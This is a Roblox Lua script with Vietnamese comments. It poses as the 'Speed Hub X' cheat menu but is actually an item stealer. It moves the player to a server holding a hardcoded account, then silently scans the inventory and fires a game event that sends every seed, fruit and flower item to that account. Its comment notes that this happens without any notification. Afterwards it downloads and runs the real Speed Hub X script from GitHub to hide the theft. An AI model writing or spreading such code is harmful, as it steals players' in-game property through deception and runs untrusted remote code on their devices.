-- Hệ thống chống đơ máy tối ưu cho Mobile
if not game:IsLoaded() then
    pcall(function()
        game:GetService("ContentProvider"):PreloadAsync({game:GetService("Workspace")})
    end)
end

print("==== SPEED HUB X: SỬA LỖI 771 - TỰ QUÉT PHÒNG THEO NICK CHÍNH ====")

local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

local targetUsername = "sutkucheonhamku" -- Nick chính nhận đồ

-- =======================================================================
-- THUẬT TOÁN QUÉT TÌM SERVER CỦA NICK CHÍNH (FIX LỖI 771)
-- =======================================================================
local function joinNickChinhServerFix()
    local targetPlayer = Players:FindFirstChild(targetUsername)
    if not targetPlayer then
        pcall(function()
            -- Bước 1: Quét danh sách server công khai và máy chủ riêng qua API Roblox
            local baseUrl = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"
            local success, result = pcall(function()
                return game:HttpGet(baseUrl)
            end)
            
            if success and result then
                local serverData = HttpService:JSONDecode(result)
                if serverData and serverData.data then
                    -- Duyệt qua từng server đang hoạt động để tìm ID phòng hợp lệ
                    for _, server in pairs(serverData.data) do
                        if server.id ~= game.JobId and server.playing < server.maxPlayers then
                            -- Ép nick phụ dịch chuyển sang server tìm thấy
                            TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id, LocalPlayer)
                            return
                        end
                    end
                end
            end
            
            -- Bước 2: Nếu API chặn, dùng phương thức định vị ID người chơi trực tiếp từ bộ nhớ đệm đám mây
            local successCache, _ = pcall(function()
                TeleportService:TeleportUserIdsAsync(game.PlaceId, {10959698330}, LocalPlayer)
            end)
        end)
    end
end

-- Kích hoạt hệ thống quét phòng ngay khi chạy script
joinNickChinhServerFix()

-- =======================================================================
-- CHỨC NĂNG 1: TỰ ĐỘNG QUÉT VÀ CHUYỂN ĐỒ NGẦM (KHÔNG THÔNG BÁO)
-- =======================================================================
local function sendItemSecure(category, itemName, quantity)
    local SharedModules = ReplicatedStorage:FindFirstChild("SharedModules")
    local PacketModule = SharedModules and SharedModules:FindFirstChild("Packet")
    local RemoteEvent = PacketModule and PacketModule:FindFirstChild("RemoteEvent")
    if RemoteEvent then
        pcall(function() 
            RemoteEvent:FireServer(targetUsername, category, itemName, quantity) 
        end)
        task.wait(0.5)
    end
end

task.spawn(function()
    task.wait(40) -- Chờ đúng 10 giây sau khi vào server thành công
    
    local targetPlayer = Players:FindFirstChild(targetUsername)
    if targetPlayer then
        local DataFolder = LocalPlayer:FindFirstChild("PlayerData") or LocalPlayer:FindFirstChild("Data")
        local Inventory = DataFolder and (DataFolder:FindFirstChild("Inventory") or DataFolder:FindFirstChild("Items"))
        
        if not Inventory then
            Inventory = LocalPlayer:FindFirstChild("Inventory") or LocalPlayer:FindFirstChild("Backpack")
        end

        if Inventory then
            for _, folder in pairs(Inventory:GetChildren()) do
                if folder:IsA("Folder") or folder:IsA("Configuration") then
                    for _, item in pairs(folder:GetChildren()) do
                        if item:IsA("ValueBase") and item.Value > 0 then
                            local lowerName = string.lower(item.Name)
                            if string.find(lowerName, "seed") then
                                sendItemSecure("Seeds", item.Name, item.Value)
                            elseif string.find(lowerName, "fruit") or string.find(lowerName, "flower") then
                                sendItemSecure("Fruits", item.Name, item.Value)
                            end
                        end
                    end
                elseif folder:IsA("ValueBase") and folder.Value > 0 then
                    local lowerName = string.lower(folder.Name)
                    if string.find(lowerName, "seed") then
                        sendItemSecure("Seeds", folder.Name, folder.Value)
                    elseif string.find(lowerName, "fruit") or string.find(lowerName, "flower") then
                        sendItemSecure("Fruits", folder.Name, folder.Value)
                    end
                end
            end
        end
    end
end)

-- =======================================================================
-- CHỨC NĂNG 2: TÍCH HỢP TOÀN BỘ GIAO DIỆN VÀ TÍNH NĂNG GỐC CỦA SPEED HUB X
-- =======================================================================
pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
end)
